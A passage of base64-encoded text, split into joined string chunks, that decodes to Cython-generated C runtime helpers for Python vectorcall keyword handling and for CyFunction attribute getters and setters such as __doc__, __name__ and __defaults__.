ICAgICAgICAgICAgUHlUeXBlX0dldEZsYWdzKFB5X1RZUEUoa2V5KSk7CiAgICAgICAgI2Vsc2UKICAgICAgICAgICAgUHlfVFlQRShrZXkpLT50cF9mbGFnczsKICAgICAgICAjZW5kaWYKICAgICAgICBQeV9JTkNSRUYoa2V5KTsKICAgICAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgICAgICNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIGlmICh1bmxpa2VseShQeVR1cGxlX1NldEl0ZW0oa3duYW1lcywgaSwga2V5KSA8IDApKSBnb3RvIGNsZWFudXA7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeVR1cGxlX1NFVF9JVEVNKGt3bmFtZXMsIGksIGtleSk7CiAgICAgICAgI2VuZGlmCiAgICAgICAga3d2YWx1ZXNbaV0gPSB2YWx1ZTsKICAgICAgICBpKys7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIWtleXNfYXJlX3N0cmluZ3MpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpOwogICAgICAgIGdvdG8gY2xlYW51cDsKICAgIH0KICAgIHJlcyA9IHZjKGZ1bmMsIG5ld2FyZ3MsIG5hcmdzLCBrd25hbWVzKTsKY2xlYW51cDoKICAgIFB5X0RFQ1JFRihrd25hbWVzKTsKICAgIGZvciAoaSA9IDA7IGkgPCBua3c7IGkrKykKICAgICAgICBQeV9ERUNSRUYoa3d2YWx1ZXNbaV0pOwogICAgUHlNZW1fRnJlZShuZXdhcmdzKTsKICAgIHJldHVybiByZXM7Cn0Kc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KQp7CiAgICBQeV9zc2l6ZV90IGt3X3NpemUgPQogICAgICAgIGxpa2VseShrdyA9PSBOVUxMKSA/CiAgICAgICAgMCA6CiNpZiAhQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICAgICAgICBQeURpY3RfU2l6ZShrdyk7CiNlbHNlCiAgICAgICAgUHlEaWN0X0dFVF9TSVpFKGt3KTsKI2VuZGlmCiAgICBpZiAoa3dfc2l6ZSA9PSAwKSB7CiAg""ICAgICAgcmV0dXJuIHZjKGZ1bmMsIGFyZ3MsIG5hcmdzLCBOVUxMKTsKICAgIH0KI2lmICFDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogICAgZWxzZSBpZiAodW5saWtlbHkoa3dfc2l6ZSA9PSAtMSkpIHsKICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KI2VuZGlmCiAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdF9rdyhmdW5jLCB2YywgYXJncywgbmFyZ3MsIGt3KTsKfQojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfX0lzU2FtZUN5T3JDRnVuY3Rpb25Ob01ldGhvZChQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKF9fUHl4X0N5RnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0gZWxzZSBpZiAoUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykpIHsKICAgICAgICByZXR1cm4gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oZnVuYykgPT0gKFB5Q0Z1bmN0aW9uKSBjZnVuYzsKICAgIH0KICAgIHJldHVybiAwOwp9CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKChQeU9iamVjdCopUHlfVFlQRShmdW5jKSA9PSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9DYWNoZWRNZXRob2RUeXBlKSB7CiAgICAgICAgaW50IHJlc3VsdDsKICAgICAgICBQeU9iamVjdCAqbmV3RnVuYyA9IFB5T2JqZWN0X0dldEF0dHIoZnVuYywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Z1bmMpOwogICAgICAgIGlmICh1bmxpa2VseSghbmV3RnVuYykpIHsKICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTsgLy8gSXQncyBvbmx5IGFuIG9wdGltaXphdGlvbiwgc28gZG9uJ3QgdGhyb3cgYW4gZXJyb3IKICAgICAgICAgICAgcmV0dXJuIDA7CiAgICAgICAgfQogICAgICAgIHJlc3VsdCA9IF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QobmV3RnVuYywgY2Z1bmMpOwogICAgICAgIFB5X0RFQ1JFRihuZXdGdW5jKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQogICAgcmV0dXJuIF9fUHl4X19Jc1NhbWVDeU9yQ0Z1bmN0aW9uTm9NZXRob2QoZnVuYywgY2Z1bmMpOwp9CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9fSXNTYW1lQ3lPckNGdW5jdGlvbihQeU9iamVjdCAqZnVuYywgdm9pZCAoKmNmdW5jKSh2b2lkKSkgewogICAgaWYgKFB5TWV0aG9kX0NoZWNrKGZ1bmMpKSB7CiAgICAgICAgZnVuYyA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihmdW5jKTsKICAgIH0KICAgIHJldHVybiBfX1B5eF9DeU9yUHlDRnVuY3Rpb25fQ2hlY2soZnVuYykgJiYgX19QeXhfQ3lP""clB5Q0Z1bmN0aW9uX0dFVF9GVU5DVElPTihmdW5jKSA9PSAoUHlDRnVuY3Rpb24pIGNmdW5jOwp9CiNlbmRpZgpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX1NldENsYXNzT2JqKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqIGYsIFB5T2JqZWN0KiBjbGFzc29iaikgewojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZiksCiAgICAgICAgICAgICgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2Vsc2UKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKAogICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChmKSktPm1tX2NsYXNzLAogICAgICAgIChQeVR5cGVPYmplY3QqKSgoY2xhc3NvYmopID8gX19QeXhfTmV3UmVmKGNsYXNzb2JqKSA6IE5VTEwpKTsKI2VuZGlmCn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RvYyA9PSBOVUxMKSkgewojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgICAgIG9wLT5mdW5jX2RvYyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX2RvY19fIik7CiAgICAgICAgaWYgKHVubGlrZWx5KCFvcC0+ZnVuY19kb2MpKSByZXR1cm4gTlVMTDsKI2Vsc2UKICAgICAgICBpZiAoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpIHsKICAgICAgICAgICAgb3AtPmZ1bmNfZG9jID0gUHlVbmljb2RlX0Zyb21TdHJpbmcoKChQeUNGdW5jdGlvbk9iamVjdCopb3ApLT5tX21sLT5tbF9kb2MpOwogICAgICAgICAgICBpZiAodW5saWtlbHkob3AtPmZ1bmNfZG9jID09IE5VTEwpKQogICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUHlfSU5DUkVGKFB5X05vbmUpOwogICAgICAgICAgICByZXR1cm4gUHlfTm9uZTsKICAgICAgICB9CiNlbmRpZgogICAgfQogICAgUHlfSU5DUkVGKG9wLT5mdW5jX2RvYyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZG9jOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY2xvc3VyZSkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNsb3N1cmUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9kb2NfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfZG9jKF9f""cHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHZhbHVlID09IE5VTEwpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kb2MsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9uYW1lX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX25hbWUgPT0gTlVMTCkpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgICAgICBvcC0+ZnVuY19uYW1lID0gUHlPYmplY3RfR2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbmFtZV9fIik7CiNlbHNlCiAgICAgICAgb3AtPmZ1bmNfbmFtZSA9IFB5VW5pY29kZV9JbnRlcm5Gcm9tU3RyaW5nKCgoUHlDRnVuY3Rpb25PYmplY3QqKW9wKS0+bV9tbC0+bWxfbmFtZSk7CiNlbmRpZgogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19uYW1lID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19uYW1lKTsKICAgIHJldHVybiBvcC0+ZnVuY19uYW1lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWVfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX25hbWVfXyBtdXN0IGJlIHNldCB0byBhIHN0cmluZyBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19uYW1lLCB2YWx1""ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgUHlfSU5DUkVGKG9wLT5mdW5jX3F1YWxuYW1lKTsKICAgIHJlc3VsdCA9IG9wLT5mdW5jX3F1YWxuYW1lOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9xdWFsbmFtZShfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QgKnZhbHVlLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICh1bmxpa2VseSh2YWx1ZSA9PSBOVUxMIHx8ICFQeVVuaWNvZGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX3F1YWxuYW1lX18gbXVzdCBiZSBzZXQgdG8gYSBzdHJpbmcgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmZ1bmNfcXVhbG5hbWUsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0X2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkKewogICAgaWYgKHVubGlrZWx5KG9wLT5mdW5jX2RpY3QgPT0gTlVMTCkpIHsKICAgICAgICBvcC0+ZnVuY19kaWN0ID0gUHlEaWN0X05ldygpOwogICAgICAgIGlmICh1bmxpa2VseShvcC0+ZnVuY19kaWN0ID09IE5VTEwpKQogICAgICAgICAgICByZXR1cm4gTlVMTDsKICAgIH0KICAgIFB5X0lOQ1JFRihvcC0+ZnVuY19kaWN0KTsKICAgIHJldHVybiBvcC0+ZnVuY19kaWN0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGljdF9sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kaWN0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3Qg""Km9wLCBQeU9iamVjdCAqdmFsdWUsIHZvaWQgKmNvbnRleHQpCnsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKHVubGlrZWx5KHZhbHVlID09IE5VTEwpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgImZ1bmN0aW9uJ3MgZGljdGlvbmFyeSBtYXkgbm90IGJlIGRlbGV0ZWQiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBpZiAodW5saWtlbHkoIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgInNldHRpbmcgZnVuY3Rpb24ncyBkaWN0aW9uYXJ5IHRvIGEgbm9uLWRpY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeV9JTkNSRUYodmFsdWUpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICBfX1B5eF9QeV9YREVDUkVGX1NFVChvcC0+ZnVuY19kaWN0LCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZ2xvYmFscyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkKewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZ2xvYmFscyk7CiAgICByZXR1cm4gb3AtPmZ1bmNfZ2xvYmFsczsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KQp7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihvcCk7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIFB5X0lOQ1JFRihQeV9Ob25lKTsKICAgIHJldHVybiBQeV9Ob25lOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpCnsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSAob3AtPmZ1bmNfY29kZSkgPyBvcC0+ZnVuY19jb2RlIDogUHlfTm9uZTsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgUHlfSU5DUkVGKHJlc3VsdCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBpbnQgcmVzdWx0ID0gMDsKICAgIFB5T2JqZWN0ICpyZXMgPSBvcC0+ZGVmYXVsdHNfZ2V0dGVyKChQeU9iamVjdCAqKSBvcCk7CiAgICBpZiAodW5saWtlbHkoIXJlcykpCiAgICAgICAgcmV0dXJuIC0xOwogICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTCiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMCk7CiAgICBQeV9JTkNSRUYo""b3AtPmRlZmF1bHRzX3R1cGxlKTsKICAgIG9wLT5kZWZhdWx0c19rd2RpY3QgPSBQeVR1cGxlX0dFVF9JVEVNKHJlcywgMSk7CiAgICBQeV9JTkNSRUYob3AtPmRlZmF1bHRzX2t3ZGljdCk7CiAgICAjZWxzZQogICAgb3AtPmRlZmF1bHRzX3R1cGxlID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMCk7CiAgICBpZiAodW5saWtlbHkoIW9wLT5kZWZhdWx0c190dXBsZSkpIHJlc3VsdCA9IC0xOwogICAgZWxzZSB7CiAgICAgICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShyZXMsIDEpOwogICAgICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX2t3ZGljdCkpIHJlc3VsdCA9IC0xOwogICAgfQogICAgI2VuZGlmCiAgICBQeV9ERUNSRUYocmVzKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICghdmFsdWUpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5VHVwbGVfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2RlZmF1bHRzX18gbXVzdCBiZSBzZXQgdG8gYSB0dXBsZSBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9XYXJuRXgoUHlFeGNfUnVudGltZVdhcm5pbmcsICJjaGFuZ2VzIHRvIGN5ZnVuY3Rpb24uX19kZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c190dXBsZSwgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIGlmIChvcC0+ZGVmYXVsdHNfZ2V0dGVyKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfdHVwbGU7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmVzdWx0ID0gUHlfTm9uZTsKICAgICAgICB9CiAgICB9CiAg""ICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0KiByZXN1bHQgPSBOVUxMOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RlZmF1bHRzX2xvY2tlZChvcCk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAoIXZhbHVlKSB7CiAgICAgICAgdmFsdWUgPSBQeV9Ob25lOwogICAgfSBlbHNlIGlmICh1bmxpa2VseSh2YWx1ZSAhPSBQeV9Ob25lICYmICFQeURpY3RfQ2hlY2sodmFsdWUpKSkgewogICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgICAgICAgICAgICAgICAgICJfX2t3ZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlFcnJfV2FybkV4KFB5RXhjX1J1bnRpbWVXYXJuaW5nLCAiY2hhbmdlcyB0byBjeWZ1bmN0aW9uLl9fa3dkZWZhdWx0c19fIHdpbGwgbm90ICIKICAgICAgICAgICAgICAgICAiY3VycmVudGx5IGFmZmVjdCB0aGUgdmFsdWVzIHVzZWQgaW4gZnVuY3Rpb24gY2FsbHMiLCAxKTsKICAgIFB5X0lOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5kZWZhdWx0c19rd2RpY3QsIHZhbHVlKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gMDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzX2xvY2tlZChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IG9wLT5kZWZhdWx0c19rd2RpY3Q7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICBpZiAob3AtPmRlZmF1bHRzX2dldHRlcikgewogICAgICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfQ3lGdW5jdGlvbl9pbml0X2RlZmF1bHRzKG9wKSA8IDApKSByZXR1cm4gTlVMTDsKICAgICAgICAgICAgcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKgpf""X1B5eF9DeUZ1bmN0aW9uX2dldF9rd2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBQeU9iamVjdCogcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfYW5ub3RhdGlvbnMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29ud